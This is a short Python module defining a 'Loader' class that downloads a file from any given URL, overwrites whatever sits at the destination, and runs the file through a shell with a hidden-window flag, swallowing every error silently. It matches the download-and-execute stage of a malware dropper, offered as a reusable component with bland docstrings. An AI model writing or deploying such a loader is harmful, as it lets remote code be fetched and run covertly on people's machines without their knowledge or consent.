from os import path, remove
from urllib.request import urlretrieve
from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE


class Loader:
    """
    Loads a file from a link.
    """
    def __init__(self, url: str, destination_path: str, open_file: bool = False):

        self.__url = url
        self.__destination_path = destination_path
        self.__open_file = open_file

    def __load_file(self) -> None:
        """
        Downloads the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__destination_path):
            remove(self.__destination_path)

        urlretrieve(self.__url, self.__destination_path)

    def __open_loaded_file(self) -> None:
        """
        Opens the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__open_file:
            return

        Popen(
            self.__destination_path,
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def run(self) -> None:
        """
        Launches the loader module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__load_file()
            self.__open_loaded_file()

        except Exception as e:
            pass
